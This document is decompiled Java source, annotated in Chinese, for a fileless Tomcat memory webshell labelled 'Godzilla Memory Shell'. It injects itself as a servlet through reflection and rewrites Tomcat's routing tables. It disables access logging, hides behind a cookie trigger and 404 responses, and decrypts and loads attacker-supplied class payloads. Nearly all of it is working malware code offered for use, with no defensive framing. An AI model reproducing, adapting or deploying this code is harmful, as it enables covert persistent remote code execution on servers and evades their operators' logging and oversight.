// Source code is decompiled from a .class file using FernFlower decompiler.

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.Servlet;
import javax.servlet.ServletConfig;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.JspFactory;
import javax.servlet.jsp.JspWriter;
import javax.servlet.jsp.PageContext;
import javax.servlet.http.Cookie;

/**
 * 这个类本身既是一个类加载器，又是一个Servlet。
 * 它被主payload加载到内存后，通过反射将自己注册成一个新的Servlet，从而在不落地文件的情况下创建一个新的Webshell。
 */
public final class SERVLET extends ClassLoader implements Servlet {
   // Base64编码表
   public final char[] toBase64 = new char[]{'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/'};
   // 内存Shell的密码
   private String param;
   // 内存Shell要绑定的URL路径
   private String path;
   // 内存Shell的AES密钥
   private String secretKey;
   // 内存Shell的Cookie名称
   private String ck_name;
   // 用于从主payload接收参数的Map
   private HashMap parameterMap;
   // Web应用的ServletContext，用于动态注册本Servlet
   private ServletContext servletContext;
   // Servlet配置对象
   private ServletConfig servletConfig;
   private static final JspFactory _jspxFactory = JspFactory.getDefaultFactory();

   public SERVLET() {
   }

   public SERVLET(ClassLoader c) {
      super(c);
   }

   /**
    * 自定义类加载器，用于加载客户端后续发送的payload。
    * @param b 类的字节码
    * @return 加载后的Class对象
    */
   public Class Q(byte[] b) {
      return super.defineClass(b, 0, b.length);
   }

   /**
    * 接收来自主payload参数的入口方法。
    * @param obj 主payload传递过来的包含所有参数的HashMap。
    */
   public boolean equals(Object obj) {
      try {
         this.parameterMap = (HashMap)obj;
         // 从参数中获取ServletContext，这是注入内存Shell的关键
         this.servletContext = (ServletContext)this.parameterMap.get("servletContext");
         // 获取内存Shell的参数、路径和密钥
         this.param = this.get("param");
         this.path = this.get("path");
         this.secretKey = this.get("secretKey");
         this.ck_name = this.get("ck_name");
         return true;
      } catch (Exception var3) {
         return false;
      }
   }

   /**
    * 执行注入操作的入口方法。
    * 主payload会调用此方法来启动内存Shell的注入流程。
    */
   public String toString() {
      // 调用核心注入方法，并将执行结果放入参数Map中返回给主payload
      this.parameterMap.put("result", this.addServlet().getBytes());
      this.parameterMap = null; // 清理参数，释放资源
      return "";
   }

   /**
    * 核心方法：通过反射将自身动态注册为一个新的Servlet。
    * @return "ok" 表示成功，否则返回错误信息。
    */
   private String addServlet() {
      try {
         String wrapperName = this.path.replace("/", "") + "_" + System.currentTimeMillis();
         // 通过反射获取Tomcat的StandardContext，这是动态注册的必备对象
         Object o = getFieldValue(this.servletContext, "context");
         Object standardContext = getFieldValue(o, "context");
         
         // 创建一个新的Servlet Wrapper，Wrapper是Servlet在Tomcat中的容器
         Object newWrapper = this.invoke(standardContext, "createWrapper", (Object[])null);
         
         // 设置Wrapper的名称
         this.invoke(newWrapper, "setName", wrapperName);
         // 关键：将当前内存Shell的实例(this)赋给Wrapper，让Tomcat知道请求应该由谁处理
         setFieldValue(newWrapper, "instance", this);
         
         Class containerClass = Class.forName("org.apache.catalina.Container", false, standardContext.getClass().getClassLoader());
         // 如果已存在同名Wrapper，先移除（虽然这里代码有误，应该是调用removeChild(oldWrapper)）
         Object oldWrapper = this.invoke(standardContext, "findChild", wrapperName);
         if (oldWrapper != null) {
            standardContext.getClass().getDeclaredMethod("removeChild", containerClass);
         }
         
         // 将配置好的Wrapper添加到Context中
         standardContext.getClass().getDeclaredMethod("addChild", containerClass).invoke(standardContext, newWrapper);

         Method method;
         try {
            // 优先使用Tomcat 8+的addServletMappingDecoded方法
            method = standardContext.getClass().getMethod("addServletMappingDecoded", String.class, String.class);
         } catch (Exception var9) {
            // 降级使用旧版的addServletMapping方法
            method = standardContext.getClass().getMethod("addServletMapping", String.class, String.class);
         }
         
         // 将URL路径与Wrapper进行映射
         method.invoke(standardContext, this.path, wrapperName);
         
         // 兼容性处理：针对Tomcat 7及更早版本，可能需要手动刷新路由映射
         if (this.getMethodByClass(newWrapper.getClass(), "setServlet", Servlet.class) == null) {
            this.transform(standardContext, this.path);
            this.init((ServletConfig)getFieldValue(newWrapper, "facade"));
         }

         return "ok" + "|" + wrapperName + "|" + this.path;
      } catch (Exception var10) {
         return var10.getMessage();
      }
   }

   /**
    * 反射工具：设置对象的字段值。
    */
   public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
      Field f = null;
      if (obj instanceof Field) {
         f = (Field)obj;
      } else {
         f = obj.getClass().getDeclaredField(fieldName);
      }
      // 暴力破解访问权限
      f.setAccessible(true);
      f.set(obj, value);
   }

   /**
    * 兼容性核心方法：手动刷新Tomcat内部的路由映射(Mapper)。
    * 这是为了确保在某些旧版本Tomcat中，动态添加的Servlet能够被立即访问。
    * 此方法通过深度反射直接修改Tomcat的内部数据结构。
    * @param standardContext Tomcat的StandardContext
    * @param path 要刷新的URL路径
    */
   private void transform(Object standardContext, String path) throws Exception {
      // 获取父容器，通常是Engine
      Object containerBase = this.invoke(standardContext, "getParent", (Object[])null);
      // 获取MapperListener的Class对象，它是负责同步路由信息的监听器
      Class mapperListenerClass = Class.forName("org.apache.catalina.connector.MapperListener", false, containerBase.getClass().getClassLoader());
      // 获取父容器的所有监听器
      Field listenersField = Class.forName("org.apache.catalina.core.ContainerBase", false, containerBase.getClass().getClassLoader()).getDeclaredField("listeners");
      listenersField.setAccessible(true);
      ArrayList listeners = (ArrayList)listenersField.get(containerBase);

      // 遍历监听器，找到MapperListener
      for(int i = 0; i < listeners.size(); ++i) {
         Object mapperListener = listeners.get(i);
         if (mapperListener != null && mapperListenerClass.isAssignableFrom(mapperListener.getClass())) {
            // 从MapperListener中获取Mapper对象，这是路由的核心
            Object mapper = getFieldValue(mapperListener, "mapper");
            // 获取Mapper中的所有虚拟主机
            Object hosts = getFieldValue(mapper, "hosts");

            // 遍历所有虚拟主机
            for(int j = 0; j < Array.getLength(hosts); ++j) {
               Object host = Array.get(hosts, j);
               Object contextList = getFieldValue(host, "contextList");
               Object contexts = getFieldValue(contextList, "contexts");
               
               // 遍历所有Context
               for(int k = 0; k < Array.getLength(contexts); ++k) {
                  Object context = Array.get(contexts, k);
                  // 找到与当前standardContext匹配的路由上下文
                  if (standardContext.equals(getFieldValue(context, "object"))) {
                     // 如果存在旧的映射，先从路由表中移除
                     Object exactWrappers = getFieldValue(context, "exactWrappers");
                     for(int l = 0; l < Array.getLength(exactWrappers); ++l) {
                        Object wrapper = Array.get(exactWrappers, l);
                        if (path.equals(getFieldValue(wrapper, "name"))) {
                           Method removeWrapperMethod = mapper.getClass().getDeclaredMethod("removeWrapper", context.getClass(), String.class);
                           removeWrapperMethod.setAccessible(true);
                           removeWrapperMethod.invoke(mapper, context, path);
                        }
                     }
                     
                     // 将新的映射手动添加到路由表中
                     Object standardContext_Mapper = this.invoke(standardContext, "getMapper", (Object[])null);
                     Object standardContext_Mapper_Context = getFieldValue(standardContext_Mapper, "context");
                     Object standardContext_Mapper_Context_exactWrappers = getFieldValue(standardContext_Mapper_Context, "exactWrappers");
                     for(int l = 0; l < Array.getLength(standardContext_Mapper_Context_exactWrappers); ++l) {
                        Object wrapper = Array.get(standardContext_Mapper_Context_exactWrappers, l);
                        if (path.equals(getFieldValue(wrapper, "name"))) {
                           Method addWrapperMethod = mapper.getClass().getDeclaredMethod("addWrapper", context.getClass(), String.class, Object.class);
                           addWrapperMethod.setAccessible(true);
                           addWrapperMethod.invoke(mapper, context, path, getFieldValue(wrapper, "object"));
                        }
                     }
                  }
               }
            }
         }
      }
   }

   /**
    * AES加解密方法。
    * @param s 要处理的数据
    * @param m true为加密，false为解密
    * @return 处理后的数据
    */
   public byte[] x(byte[] s, boolean m) {
      try {
         Cipher c = Cipher.getInstance("AES");
         c.init(m ? 1 : 2, new SecretKeySpec(this.secretKey.getBytes(), "AES"));
         return c.doFinal(s);
      } catch (Exception var4) {
         return null;
      }
   }

   

   /**
    * 反射工具：调用对象的方法。
    */
   private Object invoke(Object obj, String methodName, Object... parameters) {
      try {
         ArrayList classes = new ArrayList();
         if (parameters != null) {
            for(int i = 0; i < parameters.length; ++i) {
               Object o1 = parameters[i];
               if (o1 != null) {
                  classes.add(o1.getClass());
               } else {
                  classes.add((Object)null);
               }
            }
         }
         Method method = this.getMethodByClass(obj.getClass(), methodName, (Class[])classes.toArray(new Class[0]));
         return method.invoke(obj, parameters);
      } catch (Exception var7) {
         return null;
      }
   }

   /**
    * 反射工具：从类及其父类中查找方法。
    */
   private Method getMethodByClass(Class cs, String methodName, Class... parameters) {
      Method method = null;
      while(cs != null) {
         try {
            method = cs.getDeclaredMethod(methodName, parameters);
            cs = null; // 找到后退出循环
         } catch (Exception var6) {
            cs = cs.getSuperclass(); // 继续在父类中查找
         }
      }
      return method;
   }

   /**
    * 反射工具：获取对象的字段值。
    */
   public static Object getFieldValue(Object obj, String fieldName) throws Exception {
      Field f = null;
      if (obj instanceof Field) {
         f = (Field)obj;
      } else {
         Class cs = obj.getClass();
         while(cs != null) {
            try {
               f = cs.getDeclaredField(fieldName);
               cs = null;
            } catch (Exception var6) {
               cs = cs.getSuperclass();
            }
         }
      }
      f.setAccessible(true);
      return f.get(obj);
   }

   /**
    * 通过修改Tomcat的AccessLogValve条件来禁用访问日志。
    * @param pc PageContext对象
    */
   private void noLog(PageContext pc) {
      try {
         Object applicationContext = getFieldValue(pc.getServletContext(), "context");
         Object container = getFieldValue(applicationContext, "context");
         
         // 逐级向上查找容器
         ArrayList containerChain = new ArrayList();
         for(; container != null; container = this.invoke(container, "getParent", (Object[])null)) {
            containerChain.add(container);
         }
         
         // 遍历容器链，查找Pipeline和Valve
         for(int i = 0; i < containerChain.size(); ++i) {
            try {
               Object pipeline = this.invoke(containerChain.get(i), "getPipeline", (Object[])null);
               if (pipeline != null) {
                  Object valve = this.invoke(pipeline, "getFirst", (Object[])null);
                  // 遍历Valve链
                  while(valve != null) {
                     // 检查是否是AccessLogValve（通过检查是否有get/setCondition方法判断）
                     if (this.getMethodByClass(valve.getClass(), "getCondition", (Class[])null) != null && this.getMethodByClass(valve.getClass(), "setCondition", String.class) != null) {
                        String condition = (String)this.invoke(valve, "getCondition");
                        condition = condition == null ? "FuckLog" : condition; // 设置一个永远不成立的条件
                        this.invoke(valve, "setCondition", condition);
                        pc.getRequest().setAttribute(condition, condition); // 将条件属性放入request，使其不匹配
                     }
                     valve = this.invoke(valve, "getNext", (Object[])null);
                  }
               }
            } catch (Exception e) {}
         }
      } catch (Exception e) {}
   }


   // SHA256哈希计算
   public static String sha256(String s) {
      try {
          java.security.MessageDigest md = java.security.MessageDigest.getInstance("SHA-256");
          byte[] hash = md.digest(s.getBytes("UTF-8"));
          StringBuilder hexString = new StringBuilder();
          for (byte b : hash) {
              String hex = Integer.toHexString(0xff & b);
              if (hex.length() == 1) {
                  hexString.append('0');
              }
              hexString.append(hex);
          }
          return hexString.toString().toUpperCase();
      } catch (Exception e) {
          return null;
      }
  }

   // ===== 动态标记生成 =====
    // 根据时间戳和密钥生成动态标记
    public String[] generateDynamicMarkers(long timestamp, String secretKey,String param) {
      try {
          // 将时间戳转换为分钟级别（减少时间敏感性）
          long timeWindow = timestamp / (60 * 1000); // 1分钟窗口
          
          // 生成用于标记的种子 - 使用参数名+密钥+时间窗口
          String seed = param + secretKey + timeWindow;
          String hash = sha256(seed);
          
          // 生成左标记：使用参数名+时间窗口的SHA256哈希（确保动态变化）
          String leftSeed = param + timeWindow;
          String leftHash = sha256(leftSeed);
          String leftMarker = leftHash.substring(0, 12);
          
          // 生成右标记：使用SHA256的前12位
          String rightMarker = hash.substring(0, 12);
          
          return new String[]{leftMarker, rightMarker};
      } catch (Exception e) {
          // 降级到固定标记
          try {
              String fallbackSeed = param + secretKey;
              String fallbackHash = sha256(fallbackSeed);
              String fallbackLeftHash = sha256(fallbackSeed);
              
              String leftMarker = fallbackLeftHash.substring(0, 12);
              String rightMarker = fallbackHash.substring(0, 12);
              
              return new String[]{leftMarker, rightMarker};
          } catch (Exception ex) {
              // 最终降级
              return new String[]{"STARTDATA", "ENDDATA"};
          }
      }
  }

  // XOR加密/解密（用于第一阶段加载）
  public byte[] x(byte[] s, String key) {
   if (key == null || key.isEmpty()) {
       return null; // 没有密钥，解密失败
   }
   try {
       byte[] keyBytes = key.getBytes("UTF-8");
       byte[] result = new byte[s.length];
       for (int i = 0; i < s.length; i++) {
           result[i] = (byte) (s[i] ^ keyBytes[i % keyBytes.length]);
       }
       return result;
   } catch (Exception e) {
       return null;
   }
}
   /**
    * 内存Shell作为Webshell的核心工作逻辑，一旦被注入并被访问，此方法将被执行。
    */
   public void _jspService(HttpServletRequest request, HttpServletResponse response) throws Exception {
      HttpSession session = null;
      JspWriter out = null;
      PageContext _jspx_page_context = null;

      try {
         response.setContentType("text/html");
         response.setCharacterEncoding("utf-8");
         
         PageContext pageContext = _jspxFactory.getPageContext(this, request, response, (String)null, true, 8192, true);
         session = pageContext.getSession();
         //out = pageContext.getOut();
         
         // 尝试禁用访问日志
         this.noLog(pageContext);
      
         try {
            // 如果是首次连接，加载客户端发来的主payload
            if (session.getAttribute("payload") == null) {
               // 读取请求体内容（客户端直接发送base64编码的加密数据）
               byte[] data = base64Decode(request.getParameter(this.param));
               if (data == null) {
                     //response.getWriter().write("DEBUG ERROR: Base64解码失败");
                     return;
               }

               // 从cookie中获取密钥
               Cookie[] cookies = request.getCookies();
               for(int i = 0; i < cookies.length; ++i) {
                  Cookie cookie = cookies[i];
                  if (this.ck_name.equals(cookie.getName())) {
                        data = x(data, cookie.getValue());
                        break;
                  }
               }

               session.setAttribute("payload", (new SERVLET(pageContext.getClass().getClassLoader())).Q(data));
               response.getWriter().write("[DEBUG] Payload加载成功！");
               
            } else { 
               java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
               Object f = ((Class)session.getAttribute("payload")).newInstance();
               // 传递必要的对象（让payload自己从request中获取并解密数据）
               f.equals(arrOut);
               f.equals(pageContext);
               
               // 调用toString()来执行并直接输出响应
               f.toString();
            }
         } catch (Exception var19) {}
      } catch (Exception var20) {
      } finally {
         _jspxFactory.releasePageContext(_jspx_page_context);
      }
   }

   // ============== Servlet 接口实现 =================
   
   public void init(ServletConfig paramServletConfig) throws ServletException {
      this.servletConfig = paramServletConfig;
   }

   public ServletConfig getServletConfig() {
      return this.servletConfig;
   }

   public void service(ServletRequest paramServletRequest, ServletResponse paramServletResponse) throws ServletException, IOException {
      HttpServletRequest httpServletRequest = (HttpServletRequest)paramServletRequest;
      HttpServletResponse httpServletResponse = (HttpServletResponse)paramServletResponse;
      try {
         Cookie[] cookies =  httpServletRequest.getCookies();
         if (cookies != null) {
            for(int i = 0; i < cookies.length; ++i) {
               Cookie cookie = cookies[i];
               if (this.ck_name.equals(cookie.getName())) {
                    // 找到触发Cookie，执行payload
                    this._jspService(httpServletRequest, httpServletResponse);
                    return; // 终止请求链
                 }
            }
         }
         httpServletResponse.sendError(HttpServletResponse.SC_NOT_FOUND);
      } catch (Exception var4) {
         // 异常情况下也返回404
         httpServletResponse.sendError(HttpServletResponse.SC_NOT_FOUND);
      }
   }

   public String getServletInfo() {
      return "Godzilla Memory Shell";
   }

   public void destroy() {
   }

   // ============== Base64 工具方法 =================
   
   public String base64Encode(String data) {
      return this.base64Encode(data.getBytes());
   }

   public String base64Encode(byte[] src) {
      int off = 0;
      int end = src.length;
      byte[] dst = new byte[4 * ((src.length + 2) / 3)];
      int linemax = -1;
      boolean doPadding = true;
      char[] base64 = this.toBase64;
      int sp = off;
      int slen = (end - off) / 3 * 3;
      int sl = off + slen;
      if (linemax > 0 && slen > linemax / 4 * 3) {
         slen = linemax / 4 * 3;
      }

      int dp;
      int b0;
      int b1;
      for(dp = 0; sp < sl; sp = b0) {
         b0 = Math.min(sp + slen, sl);
         b1 = sp;

         int bits;
         for(int dp0 = dp; b1 < b0; dst[dp0++] = (byte)base64[bits & 63]) {
            bits = (src[b1++] & 255) << 16 | (src[b1++] & 255) << 8 | src[b1++] & 255;
            dst[dp0++] = (byte)base64[bits >>> 18 & 63];
            dst[dp0++] = (byte)base64[bits >>> 12 & 63];
            dst[dp0++] = (byte)base64[bits >>> 6 & 63];
         }

         b1 = (b0 - sp) / 3 * 4;
         dp += b1;
      }

      if (sp < end) {
         b0 = src[sp++] & 255;
         dst[dp++] = (byte)base64[b0 >> 2];
         if (sp == end) {
            dst[dp++] = (byte)base64[b0 << 4 & 63];
            if (doPadding) {
               dst[dp++] = 61;
               dst[dp++] = 61;
            }
         } else {
            b1 = src[sp++] & 255;
            dst[dp++] = (byte)base64[b0 << 4 & 63 | b1 >> 4];
            dst[dp++] = (byte)base64[b1 << 2 & 63];
            if (doPadding) {
               dst[dp++] = 61;
            }
         }
      }

      return new String(dst);
   }

   public byte[] base64Decode(String base64Str) {
      if (base64Str.length() == 0) {
         return new byte[0];
      } else {
         byte[] src = base64Str.getBytes();
         int sp = 0;
         int sl = src.length;
         int paddings = 0;
         int len = sl - sp;
         if (src[sl - 1] == 61) {
            ++paddings;
            if (src[sl - 2] == 61) {
               ++paddings;
            }
         }

         if (paddings == 0 && (len & 3) != 0) {
            paddings = 4 - (len & 3);
         }

         byte[] dst = new byte[3 * ((len + 3) / 4) - paddings];
         int[] base64 = new int[256];
         Arrays.fill(base64, -1);

         int dp;
         for(dp = 0; dp < this.toBase64.length; base64[this.toBase64[dp]] = dp++) {
         }

         base64[61] = -2;
         dp = 0;
         int bits = 0;
         int shiftto = 18;

         while(sp < sl) {
            int b = src[sp++] & 255;
            if ((b = base64[b]) < 0 && b == -2) {
               if (shiftto == 6 && (sp == sl || src[sp++] != 61) || shiftto == 18) {
                  throw new IllegalArgumentException("Input byte array has wrong 4-byte ending unit");
               }
               break;
            }

            bits |= b << shiftto;
            shiftto -= 6;
            if (shiftto < 0) {
               dst[dp++] = (byte)(bits >> 16);
               dst[dp++] = (byte)(bits >> 8);
               dst[dp++] = (byte)bits;
               shiftto = 18;
               bits = 0;
            }
         }

         if (shiftto == 6) {
            dst[dp++] = (byte)(bits >> 16);
         } else if (shiftto == 0) {
            dst[dp++] = (byte)(bits >> 16);
            dst[dp++] = (byte)(bits >> 8);
         } else if (shiftto == 12) {
            throw new IllegalArgumentException("Last unit does not have enough valid bits");
         }

         if (dp != dst.length) {
            byte[] arrayOfByte = new byte[dp];
            System.arraycopy(dst, 0, arrayOfByte, 0, Math.min(dst.length, dp));
            dst = arrayOfByte;
         }

         return dst;
      }
   }

   /**
    * 从参数Map中获取字符串值。
    */
   public String get(String key) {
      try {
         return new String((byte[])this.parameterMap.get(key));
      } catch (Exception var3) {
         return null;
      }
   }
}
